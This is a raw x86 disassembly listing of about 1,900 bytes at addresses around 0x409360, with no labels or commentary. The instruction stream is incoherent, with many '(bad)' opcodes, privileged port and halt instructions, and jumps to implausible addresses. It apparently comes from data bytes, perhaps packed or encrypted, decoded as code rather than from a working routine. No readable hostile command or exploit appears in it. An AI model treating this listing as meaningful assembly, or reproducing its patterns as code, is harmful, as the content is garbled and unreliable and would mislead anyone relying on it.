  40935e:	ja     0x409349
  409360:	add    al,0x10
  409362:	inc    ebx
  409363:	inc    esi
  409364:	sahf   
  409365:	dec    eax
  409366:	(bad)  [esi-0x26]
  409369:	rcr    DWORD PTR [ecx],cl
  40936b:	push   es
  40936c:	or     eax,0x7b46a34e
  409371:	into   
  409372:	dec    eax
  409373:	mov    esi,0xc448c339
  409378:	sub    edi,DWORD PTR [ecx]
  40937a:	stc    
  40937b:	or     BYTE PTR [ebx-0x61ea5dc5],0xb0
  409382:	(bad)  
  409383:	test   eax,0x15ef54e4
  409388:	jmp    0xb427285a
  40938d:	pop    ds
  40938e:	add    edx,esp
  409390:	jge    0x4093dc
  409392:	sub    edx,DWORD PTR [edx+ebp*1+0x648d3fb9]
  409399:	dec    esp
  40939a:	mov    bl,0xb3
  40939c:	mov    esp,0x1481d89
  4093a1:	stos   BYTE PTR es:[edi],al
  4093a2:	aaa    
  4093a3:	lea    esi,[esi-0x1af2d14e]
  4093a9:	retf   
  4093aa:	pushf  
  4093ab:	out    dx,eax
  4093ac:	jmp    0x2c0e:0x372406dd
  4093b3:	repz repz sub eax,0x2292739
  4093ba:	adc    BYTE PTR [ebp-0x57],bl
  4093bd:	adc    ecx,esp
  4093bf:	pop    ds
  4093c0:	leave  
  4093c1:	push   edi
  4093c2:	outs   dx,DWORD PTR ds:[esi]
  4093c3:	(bad)  
  4093c4:	pop    eax
  4093c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093c6:	xor    edi,ecx
  4093c8:	imul   BYTE PTR [esp+ebp*4-0x2c11ba2]
  4093cf:	leave  
  4093d0:	je     0x4093d5
  4093d2:	mov    DWORD PTR [edx+ebx*1],esi
  4093d5:	jae    0x409423
  4093d7:	out    dx,al
  4093d8:	in     al,dx
  4093d9:	mov    ah,0x1c
  4093db:	sub    al,0x90
  4093dd:	and    ah,ah
  4093df:	fstp   DWORD PTR [ebx-0x3b8db0ce]
  4093e5:	xor    eax,0xe1eb5a46
  4093ea:	nop
  4093eb:	cmp    eax,DWORD PTR [ecx+0x353dc7c7]
  4093f1:	test   al,0x90
  4093f3:	xchg   esi,eax
  4093f4:	ret    
  4093f5:	adc    eax,0xbd409168
  4093fa:	stos   BYTE PTR es:[edi],al
  4093fb:	popf   
  4093fc:	xchg   ecx,eax
  4093fd:	and    ebp,edi
  4093ff:	push   ebx
  409400:	sub    DWORD PTR [esi],esi
  409402:	or     DWORD PTR [edx],esi
  409404:	aam    0x9f
  409406:	in     al,0x2b
  409408:	jne    0x409392
  40940a:	pushf  
  40940b:	das    
  40940c:	mov    esi,0x4648482b
  409411:	xchg   ecx,eax
  409412:	adc    cl,BYTE PTR [esi]
  409414:	cld    
  409415:	test   bl,dl
  409417:	(bad)
  40941a:	pop    edx
  40941b:	retf   
  40941c:	inc    esi
  40941d:	mov    BYTE PTR [ebx+0x7c8a6865],dl
  409423:	mov    bl,0xd
  409425:	dec    eax
  409426:	fwait
  409427:	mov    dl,0x14
  409429:	mov    edi,0x99cdfc0b
  40942e:	cwde   
  40942f:	pop    esi
  409430:	mov    bl,0xc4
  409432:	pop    edx
  409433:	fild   QWORD PTR [ebp+0x41630921]
  409439:	xor    BYTE PTR [ecx-0x41],cl
  40943c:	mov    al,0x4b
  40943e:	inc    edi
  40943f:	(bad)
  409442:	dec    esi
  409443:	and    ebp,ecx
  409445:	cwde   
  409446:	addr16 push esp
  409448:	aaa    
  409449:	push   0x1bb3aac1
  40944e:	jmp    0x409451
  409450:	sbb    BYTE PTR [edi+0x18],0x77
  409454:	leave  
  409455:	jne    0x4093e8
  409457:	push   es
  409458:	lea    esp,[ebx+0x2]
  40945b:	(bad)  
  40945c:	and    BYTE PTR [edi-0x4a6bd12],dl
  409462:	data16 mov bh,0xb2
  409465:	jnp    0x4094de
  409467:	push   ebx
  409468:	xor    esi,eax
  40946a:	inc    eax
  40946b:	mov    al,ds:0xb965970d
  409470:	ins    DWORD PTR es:[edi],dx
  409471:	sbb    al,0x69
  409473:	dec    ebp
  409474:	fdiv   st(6),st
  409476:	hlt    
  409477:	pop    edx
  409478:	daa    
  409479:	cmp    cl,BYTE PTR [edi+0x1d]
  40947c:	add    BYTE PTR [eax-0x63],bh
  40947f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409480:	test   DWORD PTR [edi+esi*2+0x4796a768],ecx
  409487:	mov    cl,0x47
  409489:	popa   
  40948a:	je     0x409476
  40948c:	cmp    BYTE PTR [edi+0x74aa1736],al
  409492:	sub    eax,0x6312c962
  409497:	fld    QWORD PTR [edx+edi*1]
  40949a:	test   DWORD PTR [ebx+0x0],ebp
  40949d:	clc    
  40949e:	add    DWORD PTR [edi-0x2a],edi
  4094a1:	pop    ebp
  4094a2:	fild   DWORD PTR [ecx]
  4094a4:	mov    DWORD PTR [ecx+0x222dead3],esp
  4094aa:	inc    edx
  4094ab:	xor    BYTE PTR [esi+0x6],bl
  4094ae:	mov    ebp,0x8f4f8489
  4094b3:	inc    ebp
  4094b4:	and    al,0x51
  4094b6:	icebp  
  4094b7:	xor    BYTE PTR [ecx],ch
  4094b9:	push   eax
  4094ba:	sbb    ch,cl
  4094bc:	jmp    0x3f3f4990
  4094c1:	test   BYTE PTR [edi+0x2dc86c15],cl
  4094c7:	jnp    0x4094f0
  4094c9:	jge    0x409486
  4094cb:	call   0xfc848fee
  4094d0:	and    eax,0xc0f9f777
  4094d5:	and    eax,0x65b74821
  4094da:	cmp    eax,0xf3fc4f78
  4094df:	mov    ecx,0xc928953a
  4094e4:	movzx  ebp,BYTE PTR [edx-0x502beb0f]
  4094eb:	mov    ds:0x4569c764,eax
  4094f0:	mov    ds:0x50c5d8e8,eax
  4094f5:	push   esi
  4094f6:	sub    eax,0x96314f4b
  4094fb:	adc    BYTE PTR [edx],0x4c
  4094fe:	and    BYTE PTR [edx+ebx*4+0x35],bh
  409502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409503:	sbb    ebp,ebp
  409505:	dec    eax
  409506:	retf   0xede8
  409509:	push   cs
  40950a:	out    0x85,eax
  40950c:	lods   al,BYTE PTR ds:[esi]
  40950d:	idiv   BYTE PTR [esi+ecx*8]
  409510:	or     BYTE PTR [ebx],bl
  409512:	lea    edx,[esi]
  409514:	loope  0x4094ab
  409516:	shl    BYTE PTR [ebp+0x19],1
  409519:	xchg   BYTE PTR [edi+0x1e2a68e8],ah
  40951f:	inc    edx
  409520:	stc    
  409521:	imul   edx,DWORD PTR [ebx-0x519686d9],0xffffffac
  409528:	out    dx,eax
  409529:	mov    esp,0x1674d508
  40952e:	stos   BYTE PTR es:[edi],al
  40952f:	xor    BYTE PTR [edx-0x66c82b3a],dh
  409535:	or     cl,BYTE PTR [ecx-0x2f68b2a8]
  40953b:	xchg   DWORD PTR [ebx-0x57],ebp
  40953e:	lahf   
  40953f:	xchg   edi,edx
  409541:	adc    eax,0xd1f5532a
  409546:	jne    0x409557
  409548:	je     0x409583
  40954a:	pop    esp
  40954b:	cmp    dh,ah
  40954d:	pop    es
  40954e:	retf   
  40954f:	add    edi,DWORD PTR [edx+0x70ab3f28]
  409555:	adc    cl,BYTE PTR ds:[ebp-0x489d1a3f]
  40955c:	xchg   esi,eax
  40955d:	xchg   ebp,eax
  40955e:	or     eax,0xd8192f06
  409563:	repnz nop
  409565:	je     0x409548
  409567:	dec    ebp
  409568:	xor    BYTE PTR [ebx-0x3c],bl
  40956b:	in     al,dx
  40956c:	push   0xcb4eb9a4
  409571:	jbe    0x409565
  409573:	jb     0x409516
  409575:	jmp    0x5ccba65
  40957a:	pop    ecx
  40957b:	sub    DWORD PTR [eax-0x4cd93db5],esp
  409581:	hlt    
  409582:	xor    eax,0x9e152121
  409587:	cmp    ah,dh
  409589:	mov    eax,ds:0xe15a1241
  40958e:	rcr    DWORD PTR [ebp+edi*8-0x3970741a],cl
  409595:	scas   eax,DWORD PTR es:[edi]
  409596:	loop   0x4095ce
  409598:	lods   eax,DWORD PTR ds:[esi]
  409599:	fsub   st,st(4)
  40959b:	xchg   ebp,eax
  40959c:	sub    esi,0xffffffdd
  40959f:	aad    0x95
  4095a1:	cmc    
  4095a2:	jnp    0x409596
  4095a4:	jns    0x409556
  4095a6:	xchg   ebx,eax
  4095a7:	addr16 jmp 0x409542
  4095aa:	test   al,cl
  4095ac:	or     al,0x7c
  4095ae:	ins    DWORD PTR es:[edi],dx
  4095af:	(bad)  
  4095b0:	call   0x713b:0x41789dbe
  4095b7:	adc    eax,esp
  4095b9:	sub    eax,0xa94f00d4
  4095be:	pop    esi
  4095bf:	out    0x96,al
  4095c1:	sub    DWORD PTR [esi+edi*2+0x604b5cb3],ebx
  4095c8:	jb     0x40956e
  4095ca:	cwde   
  4095cb:	into   
  4095cc:	add    al,0x6
  4095ce:	mov    cl,0x50
  4095d0:	mov    ecx,0x295b289d
  4095d5:	jmp    0x4ec:0x17178b3c
  4095dc:	mov    dl,0x2e
  4095de:	ins    DWORD PTR es:[edi],dx
  4095df:	cmp    eax,0x96835f13
  4095e4:	dec    edx
  4095e5:	ret    0x78bc
  4095e8:	lods   al,BYTE PTR ds:[esi]
  4095e9:	ret    0xd935
  4095ec:	cld    
  4095ed:	xchg   ebp,eax
  4095ee:	or     bh,BYTE PTR [esi]
  4095f0:	imul   eax,DWORD PTR cs:[edi+0x3c],0xd6622d50
  4095f8:	dec    ebx
  4095f9:	jmp    0xd751:0xe0885531
  409600:	lods   eax,DWORD PTR ds:[esi]
  409601:	call   0xaed6:0x8a6e5183
  409608:	and    eax,0x16d2a492
  40960d:	mov    al,ds:0x20f71369
  409612:	dec    ebx
  409613:	es jmp 0x4095e0
  409616:	inc    ecx
  409617:	sbb    al,0x58
  409619:	jne    0x409629
  40961b:	shl    bl,cl
  40961d:	cs nop
  40961f:	fld    QWORD PTR [edx-0xd39d99e]
  409625:	lds    esp,FWORD PTR [eax-0x1bbb8668]
  40962b:	add    ebp,DWORD PTR [eax+ebp*1+0x637f90cf]
  409632:	adc    ch,BYTE PTR [ecx+0x5a]
  409635:	pop    esi
  409636:	mov    esp,0x9bd5a4a6
  40963b:	fs inc eax
  40963d:	dec    eax
  40963e:	cmp    al,0x9a
  409640:	adc    esp,DWORD PTR [ebx-0x5e]
  409643:	jb     0x40964d
  409645:	dec    esi
  409646:	lds    ebx,FWORD PTR [ecx+0x1a422832]
  40964c:	les    ebx,FWORD PTR [ebx+edx*8+0x738f25c7]
  409653:	jmp    FWORD PTR [esi]
  409655:	cwde   
  409656:	dec    edx
  409657:	mov    DWORD PTR [edi],ecx
  409659:	add    eax,0xa5ad85df
  40965e:	xchg   ebx,eax
  40965f:	je     0x4096a9
  409661:	xor    al,0xf6
  409663:	imul   ebp,DWORD PTR [ebp-0x12],0xffffffb3
  409667:	repz retf 
  409669:	cmp    esp,edi
  40966b:	jge    0x40965c
  40966d:	push   ds
  40966e:	mov    dh,0x28
  409670:	in     eax,0x60
  409672:	mov    WORD PTR [edx],ss
  409674:	or     bh,BYTE PTR ss:[eax-0x75]
  409678:	popa   
  409679:	mov    dh,0xfc
  40967b:	mov    bh,0x6c
  40967d:	lock sti 
  40967f:	outs   dx,DWORD PTR ds:[esi]
  409680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409681:	int    0x1
  409683:	inc    ebp
  409684:	mov    WORD PTR [ebx],?
  409686:	leave  
  409687:	into   
  409688:	add    eax,0x92fd16b5
  40968d:	bound  eax,QWORD PTR [eax]
  40968f:	inc    esp
  409690:	inc    edi
  409691:	icebp  
  409692:	dec    esp
  409693:	cmc    
  409694:	dec    ecx
  409695:	pushf  
  409696:	adc    esi,DWORD PTR [ebx-0x1e]
  409699:	cmp    BYTE PTR [ebx+ebx*1-0x1d97285e],bh
  4096a0:	or     eax,0xdf924246
  4096a5:	adc    ah,dh
  4096a7:	outs   dx,DWORD PTR ds:[esi]
  4096a8:	int    0x27
  4096aa:	pop    ds
  4096ab:	inc    edi
  4096ac:	jecxz  0x409726
  4096ae:	mov    ah,BYTE PTR [edi+0x22]
  4096b1:	lods   eax,DWORD PTR ds:[esi]
  4096b2:	pop    edi
  4096b3:	pop    es
  4096b4:	sub    DWORD PTR [edx+edx*2-0x2e],ecx
  4096b8:	cmp    eax,0xa939c78d
  4096bd:	jecxz  0x4096ce
  4096bf:	dec    esi
  4096c0:	cmp    BYTE PTR [ebp-0x22],dl
  4096c3:	jg     0x4096be
  4096c5:	cld    
  4096c6:	mov    ds:0xdb65d66,eax
  4096cb:	dec    edi
  4096cc:	pop    ebx
  4096cd:	xor    bh,al
  4096cf:	or     eax,0x82640b73
  4096d4:	push   esi
  4096d5:	cli    
  4096d6:	jno    0x409666
  4096d8:	or     eax,0x9ccbdcb
  4096dd:	mov    ch,0x3
  4096df:	stos   BYTE PTR es:[edi],al
  4096e0:	xor    DWORD PTR [edi-0x5f],esp
  4096e3:	stos   DWORD PTR es:[edi],eax
  4096e4:	or     eax,0xadf5568a
  4096e9:	repz pop ebx
  4096eb:	xchg   edx,eax
  4096ec:	pop    ecx
  4096ed:	scas   eax,DWORD PTR es:[edi]
  4096ee:	cmp    eax,0xac107cbc
  4096f3:	or     BYTE PTR ds:0x27a07b57,ch
  4096f9:	cmp    dh,BYTE PTR [edi]
  4096fb:	pushf  
  4096fc:	jmp    0x4096f9
  4096fe:	xor    al,0xa2
  409701:	aam    0x20
  409703:	(bad)  
  409704:	pop    esp
  409705:	sbb    al,bl
  409707:	or     DWORD PTR [edx+0x39],0x74614de3
  40970e:	dec    eax
  40970f:	pcmpeqd mm2,QWORD PTR [ebx-0x526dc0d]
  409716:	jge    0x409705
  409718:	inc    edx
  409719:	push   edx
  40971a:	pop    edi
  40971b:	cmp    al,0xe7
  40971d:	push   esp
  40971e:	into   
  40971f:	add    eax,0x43b830d8
  409724:	sub    ecx,ebx
  409726:	test   BYTE PTR [esi],ch
  409728:	mov    eax,0x41ba1517
  40972d:	xlat   BYTE PTR ds:[ebx]
  40972e:	xchg   edx,eax
  40972f:	inc    edx
  409730:	not    DWORD PTR [eax-0x36]
  409733:	mov    ecx,0x2241701a
  409738:	icebp  
  409739:	adc    eax,0x3b94a426
  40973e:	popf   
  40973f:	inc    edx
  409740:	dec    esp
  409741:	jmp    0x40977a
  409743:	ret    
  409744:	bound  ecx,QWORD PTR [ebp-0x56]
  409747:	out    0x23,eax
  409749:	mov    edx,0x4ecc0b03
  40974e:	and    bl,BYTE PTR [edx-0x6b5068b6]
  409754:	push   0x22
  409756:	fist   WORD PTR [ebp+ebp*4-0x7c]
  40975a:	adc    DWORD PTR [eax],edi
  40975c:	hlt    
  40975d:	inc    edi
  40975e:	and    ebx,edi
  409760:	inc    ecx
  409761:	mov    ebp,DWORD PTR [eax]
  409763:	sahf   
  409764:	pop    ebp
  409765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409766:	pop    es
  409767:	loopne 0x40976e
  409769:	sub    esi,DWORD PTR [ecx+0x6c]
  40976c:	cmp    eax,0x6c0641ee
  409771:	imul   esp,DWORD PTR [eax-0x5a],0x116c7de5
  409778:	cdq    
  409779:	mov    ds:0x59cc5c6d,al
  40977e:	mov    ebp,0x558f373b
  409783:	pop    ebp
  409784:	mov    es,WORD PTR [esi]
  409786:	and    BYTE PTR [edx],al
  409788:	adc    dl,dl
  40978a:	or     eax,edx
  40978c:	ret    0xb6d0
  40978f:	mov    ch,0xcf
  409791:	es mov al,0x2c
  409794:	shl    DWORD PTR [ecx+0x76],cl
  409797:	test   eax,0xc1d69127
  40979c:	jl     0x40976e
  40979e:	out    dx,al
  40979f:	xor    DWORD PTR [edx],esp
  4097a1:	and    BYTE PTR [edi-0x3f375039],dl
  4097a7:	mov    cl,0x7d
  4097a9:	mov    bl,0x95
  4097ab:	mov    bl,0x7c
  4097ad:	or     BYTE PTR [edx],ah
  4097af:	mov    eax,DWORD PTR [eax]
  4097b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097b2:	dec    esp
  4097b3:	aaa    
  4097b4:	jno    0x4097b3
  4097b6:	mov    esp,0x751294c
  4097bb:	(bad)  
  4097bc:	imul   ecx,DWORD PTR [esi+esi*2+0x5b],0xae2db46e
  4097c4:	leave  
  4097c5:	call   DWORD PTR ds:0x4adfe2c7
  4097cb:	add    BYTE PTR [eax+edx*8],bh
  4097ce:	inc    esi
  4097cf:	cmp    DWORD PTR [ebx],edi
  4097d1:	push   cs
  4097d2:	mov    ecx,0xd6fb7361
  4097d7:	xchg   BYTE PTR [ecx+0x0],ch
  4097da:	mov    ah,0xfc
  4097dc:	js     0x40980a
  4097de:	shl    bh,0x6d
  4097e1:	pop    ebp
  4097e2:	xor    BYTE PTR [esi-0x7e],ch
  4097e5:	pop    eax
  4097e6:	mov    eax,ds:0x289d3835
  4097eb:	ret    
  4097ec:	loopne 0x409838
  4097ee:	xchg   ebp,eax
  4097ef:	rcr    DWORD PTR [eax+0x3c],1
  4097f2:	mov    esi,0x2f40f1c0
  4097f7:	jmp    0xb2c6f75c
  4097fc:	sub    DWORD PTR [esi],edi
  4097fe:	xor    DWORD PTR [edi],esi
  409800:	fldenv ss:[edx+ebp*8-0x5c]
  409805:	loop   0x4097cc
  409807:	add    esp,esp
  409809:	pop    esp
  40980a:	xor    eax,0xf29ff73
  40980f:	mov    edi,0x757e28cd
  409814:	dec    ebx
  409815:	xchg   ebp,eax
  409816:	xchg   ecx,eax
  409817:	fst    st(4)
  409819:	pop    esp
  40981a:	es cmp al,0x8c
  40981d:	lock mov ch,0x38
  409820:	enter  0x20e5,0x2c
  409824:	js     0x409870
  409826:	mul    DWORD PTR [edi+0x78]
  409829:	(bad)  
  40982a:	pop    edx
  40982b:	lea    esp,[eax]
  40982d:	addr16 test eax,0xcbd6dd78
  409833:	std    
  409834:	adc    al,0xc1
  409836:	and    BYTE PTR ds:0xdab0d6b1,al
  40983c:	sbb    DWORD PTR [ebx-0x5e],0xb990dd0f
  409843:	push   esp
  409844:	mov    eax,ds:0x7c3ed815
  409849:	mov    eax,ds:0xf9f95802
  40984e:	inc    esi
  40984f:	(bad)  
  409850:	push   0x58061649
  409855:	je     0x4098b7
  409857:	ud1    edi,DWORD PTR [ecx]
  40985a:	push   ds
  40985b:	cdq    
  40985c:	jo     0x40983d
  40985e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40985f:	pop    esp
  409860:	jnp    0x409846
  409862:	fsubr  DWORD PTR [edi-0x51]
  409865:	xchg   BYTE PTR [ebx+0x50a3bd7e],bh
  40986b:	mov    bh,0xf6
  40986d:	aas    
  40986e:	inc    ebp
  40986f:	aad    0x20
  409871:	add    al,0x55
  409873:	dec    edx
  409874:	pop    eax
  409875:	es mov dh,0x4a
  409878:	out    0x91,al
  40987a:	push   DWORD PTR [edx]
  40987c:	shl    eax,0x8f
  40987f:	xchg   BYTE PTR [edi],dl
  409881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409882:	(bad)  
  409884:	jb     0x4098c4
  409886:	jge    0x40985f
  409888:	xor    bl,BYTE PTR [ebx]
  40988a:	imul   ebx,DWORD PTR [ebp+0x62],0x4ea383d7
  409891:	lock xchg ebp,eax
  409893:	mov    ds:0x1ec4ec36,eax
  409898:	test   DWORD PTR [esi+0x5],ecx
  40989b:	xor    BYTE PTR [ebx],cl
  40989d:	in     al,dx
  40989e:	mov    ecx,0x1554cd4
  4098a3:	jne    0x40982e
  4098a5:	inc    edx
  4098a6:	cld    
  4098a7:	loop   0x409926
  4098a9:	mov    ds,WORD PTR [edx-0x2791913a]
  4098af:	pop    eax
  4098b0:	cmp    BYTE PTR [eax],0x16
  4098b3:	fisttp DWORD PTR [ebp-0x5bb73a53]
  4098b9:	mov    ah,0x6b
  4098bb:	sbb    dl,BYTE PTR [edx-0xc]
  4098be:	nop
  4098bf:	sbb    DWORD PTR [esi],edi
  4098c1:	jecxz  0x4098cc
  4098c3:	sar    BYTE PTR [ebx+0x72],1
  4098c6:	test   DWORD PTR [edx+0x36],0x941ee6b9
  4098cd:	add    DWORD PTR [ecx],edi
  4098cf:	and    BYTE PTR [esi-0x4faedede],dl
  4098d5:	outs   dx,DWORD PTR ds:[esi]
  4098d6:	adc    ch,BYTE PTR [ecx]
  4098d8:	dec    esp
  4098d9:	mov    edx,0xfb9375ca
  4098de:	fcom   DWORD PTR [esi]
  4098e0:	pop    ss
  4098e1:	and    ebx,DWORD PTR [edi]
  4098e3:	test   al,0x9
  4098e5:	xchg   BYTE PTR [esi+0x1b],al
  4098e8:	and    al,0x76
  4098ea:	fild   DWORD PTR [ebp-0x226a3990]
  4098f0:	jae    0x4098ff
  4098f2:	mov    esp,fs
  4098f4:	pop    es
  4098f5:	std    
  4098f6:	cmp    eax,0x41c3eddc
  4098fb:	mov    es,edi
  4098fd:	mov    ch,0xcc
  4098ff:	add    esp,0x573b1d10
  409905:	fiadd  DWORD PTR [esi]
  409907:	add    al,0x5b
  409909:	arpl   WORD PTR [edi],cx
  40990b:	jo     0x409913
  40990d:	push   edi
  40990e:	mov    al,0x67
  409910:	push   ecx
  409911:	mov    eax,ds:0xacb232e6
  409916:	xor    DWORD PTR [eax-0x7],edi
  409919:	sub    eax,0x6cc9d390
  40991e:	fdiv   DWORD PTR [edi]
  409920:	cmp    DWORD PTR [ecx-0x5d],eax
  409923:	or     eax,0xe839279d
  409928:	mov    esi,esp
  40992a:	push   ebx
  40992b:	or     bh,BYTE PTR [ebx+0x76]
  40992e:	and    DWORD PTR [esi],ecx
  409930:	add    DWORD PTR [eax-0x701e0b9c],edx
  409936:	fcom   QWORD PTR ss:[ebx+0x130ba7ed]
  40993d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40993e:	repnz fstp TBYTE PTR [ecx+0x32f2e4b1]
  409945:	jge    0x4099a9
  409947:	or     al,0xbe
  409949:	leave  
  40994a:	jecxz  0x40990c
  40994c:	fwait
  40994d:	pusha  
  40994e:	add    DWORD PTR [eax],esp
  409950:	mov    ecx,0x2e191239
  409955:	pop    esi
  409956:	iret   
  409957:	aas    
  409958:	cmp    DWORD PTR [eax],esp
  40995a:	and    al,0x90
  40995c:	sbb    DWORD PTR [esi-0x49],esi
  40995f:	sbb    eax,0xfb41c6b5
  409964:	dec    eax
  409965:	xchg   edx,eax
  409966:	inc    DWORD PTR [edx]
  409968:	xchg   DWORD PTR [edx-0x5b],edi
  40996b:	xchg   ecx,eax
  40996c:	mov    dl,0x6d
  40996e:	enter  0x3599,0x4f
  409972:	loopne 0x4099b6
  409974:	jmp    0xce79:0xad2649a1
  40997b:	push   ebx
  40997c:	(bad)  
  40997d:	in     al,0xdc
  40997f:	fs mov eax,ebp
  409982:	xor    BYTE PTR [ebx-0x57],cl
  409985:	jp     0x4099a2
  409987:	aad    0x4e
  409989:	inc    ebp
  40998a:	retf   
  40998b:	pop    edx
  40998c:	jp     0x40995a
  40998e:	outs   dx,DWORD PTR ds:[esi]
  40998f:	jle    0x40996c
  409991:	fs repnz cwde 
  409994:	mov    eax,ds:0x185db7fe
  409999:	fldcw  WORD PTR [esi+0xeb61779]
  40999f:	push   ss
  4099a0:	mov    BYTE PTR [ecx+ebp*1-0x5],dh
  4099a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099a5:	lods   eax,DWORD PTR ds:[esi]
  4099a6:	retf   
  4099a7:	test   al,0xe
  4099a9:	les    ebx,FWORD PTR [ecx]
  4099ab:	mov    bl,0x79
  4099ad:	outs   dx,BYTE PTR ds:[esi]
  4099ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099af:	inc    BYTE PTR [ecx]
  4099b1:	mov    ebx,0x4d2e1c77
  4099b6:	in     eax,dx
  4099b7:	cmc    
  4099b8:	mov    esi,0xa8c457bc
  4099bd:	or     BYTE PTR [ebx+0x5c],dh
  4099c0:	mov    ds:0x7dd28d19,eax
  4099c5:	cmp    bh,BYTE PTR [ecx-0x5f]
  4099c8:	push   edi
  4099c9:	adc    esi,esp
  4099cb:	or     ebp,esp
  4099cd:	push   edi
  4099ce:	cmp    DWORD PTR [esi+0x13],esi
  4099d1:	dec    eax
  4099d2:	cwde   
  4099d3:	leave  
  4099d4:	push   ebp
  4099d5:	mov    ebp,0x44b65e63
  4099da:	jp     0x4099f9
  4099dc:	jnp    0x4099a3
  4099de:	push   ss
  4099df:	push   ebp
  4099e0:	and    DWORD PTR [ebx-0x4fc179a7],eax
  4099e6:	push   edi
  4099e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099e8:	jmp    0xf39ff637
  4099ed:	aad    0x66
  4099ef:	pop    ebx
  4099f0:	ss loope 0x409983
  4099f3:	push   esp
  4099f4:	cmp    eax,0xc3f80967
  4099f9:	xchg   edx,eax
  4099fa:	fstp   st(0)
  4099fc:	sbb    eax,0xf9de7f4d
  409a01:	icebp  
  409a02:	ficomp WORD PTR [ebx-0x3f]
  409a05:	ror    ah,0x4e
  409a08:	imul   eax,DWORD PTR [edi],0xffffffec
  409a0b:	inc    esp
  409a0c:	mov    eax,0xfc406919
  409a11:	push   edi
  409a12:	sbb    ah,BYTE PTR [edi+0x63674b42]
  409a18:	adc    DWORD PTR [edi+0x6b3444b3],edi
  409a1e:	jne    0x4099e9
  409a20:	shl    ch,1
  409a22:	jecxz  0x409a1d
  409a24:	clc    
  409a25:	(bad)  
  409a26:	mov    esp,0x141550a1
  409a2b:	sub    al,0x8d
  409a2d:	jae    0x4099c0
  409a2f:	stos   DWORD PTR es:[edi],eax
  409a30:	or     ecx,ebx
  409a32:	or     DWORD PTR ds:0x275a31de,ebx
  409a38:	xchg   ebx,eax
  409a39:	mov    eax,0x4f5f83c0
  409a3e:	daa    
  409a3f:	icebp  
  409a40:	add    dh,al
  409a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a43:	mov    ecx,edx
  409a45:	daa    
  409a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a47:	cs popa 
  409a49:	inc    ebx
  409a4a:	inc    ebp
  409a4b:	icebp  
  409a4c:	fdivr  QWORD PTR ds:0x47cfb664
  409a52:	iret   
  409a53:	test   BYTE PTR [edx],0x2d
  409a56:	imul   ebx,edi,0xffffffc2
  409a59:	push   0x845cb200
  409a5e:	jo     0x409aa7
  409a60:	std    
  409a61:	jecxz  0x409a6c
  409a63:	pop    edi
  409a64:	(bad)  
  409a65:	and    al,0xbf
  409a67:	pop    ss
  409a68:	int3   
  409a69:	dec    edx
  409a6a:	sbb    dh,bl
  409a6c:	pop    ss
  409a6d:	in     eax,0x66
  409a6f:	lea    ecx,[ebx-0x6f8fe48d]
  409a75:	inc    ecx
  409a76:	stos   DWORD PTR es:[edi],eax
  409a77:	inc    edi
  409a78:	dec    ebx
  409a79:	clc    
  409a7a:	sub    dh,BYTE PTR ds:0x7098ac41
  409a80:	iret   
  409a81:	in     eax,0xa0
  409a83:	in     al,dx
  409a84:	jp     0x409a82
  409a86:	adc    eax,0x2d6fb94a
  409a8b:	pop    esi
  409a8c:	jge    0x409a86
  409a8e:	mov    eax,0x83e2996c
  409a93:	cmc    
  409a94:	pop    ebx
  409a95:	(bad)  
  409a96:	out    0xf,eax
  409a98:	retf   
  409a99:	dec    esp
  409a9a:	mov    eax,ds:0xc7646875
  409a9f:	sti    
  409aa0:	mov    ebx,0x4ff123b5
  409aa5:	mov    dl,0xaa
  409aa7:	nop
  409aa8:	je     0x409ac7
  409aaa:	xchg   esp,ecx
  409aac:	es sbb al,0x6
  409aaf:	ret    0xc631
  409ab2:	cmp    edi,DWORD PTR [edx]
  409ab4:	mov    ebx,DWORD PTR [ebp-0x14d4a49f]
  409aba:	add    al,0x14
  409abc:	stos   DWORD PTR es:[edi],eax
  409abd:	xchg   edx,eax
  409abe:	or     BYTE PTR [edi+0x1d],dh
  409ac1:	fs pop ss
  409ac3:	xor    BYTE PTR [edx+0x749b5c5c],ch
  409ac9:	in     al,dx
  409aca:	mov    ah,0x92
  409acc:	je     0x409aab
  409ace:	sbb    edx,DWORD PTR [eax+0x63]
  409ad1:	fmul   DWORD PTR [edi+0x7aecf22b]
  409ad7:	fisubr DWORD PTR [ebx+eiz*8]
  409ada:	xor    ecx,DWORD PTR [edx-0x4cfbe827]
  409ae0:	or     esp,DWORD PTR [ebp-0x2450e9ab]
  409ae6:	jnp    0x409b5e
  409ae8:	mov    al,ds:0x572346c8
  409aed:	lea    ebp,[ecx+0x69]
  409af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409af1:	adc    DWORD PTR [esi+0x6f2fd57b],ebx
  409af7:	mov    cl,0x42
  409af9:	pop    ss
  409afa:	loop   0x409b6b
  409afc:	mov    cl,0x2
  409afe:	cmp    esp,DWORD PTR [edi]
  409b00:	pop    edx
  409b01:	xchg   edx,eax
  409b02:	lahf   
  409b03:	pop    ebp
  409b04:	inc    ebp
  409b05:	push   cs
  409b06:	pop    ds
  409b07:	sub    al,0x34
  409b09:	push   ss
  409b0a:	jnp    0x409af7
  409b0c:	aam    0x4a
  409b0e:	jl     0x409b89
  409b10:	inc    ecx
  409b11:	out    0x89,eax
  409b13:	imul   ebp,DWORD PTR [ebp-0x6b531249],0x2e90d947
  409b1d:	cmp    al,0x7e
  409b1f:	aaa    
  409b20:	xor    bh,BYTE PTR [edx]
  409b22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b23:	sbb    BYTE PTR [edx],bh
  409b25:	push   ebp
  409b26:	pop    ecx
  409b27:	dec    BYTE PTR [ebx]
  409b29:	stos   DWORD PTR es:[edi],eax
  409b2a:	inc    ebx
  409b2b:	and    DWORD PTR [esi-0x2ab7ba66],edi
  409b31:	js     0x409abc
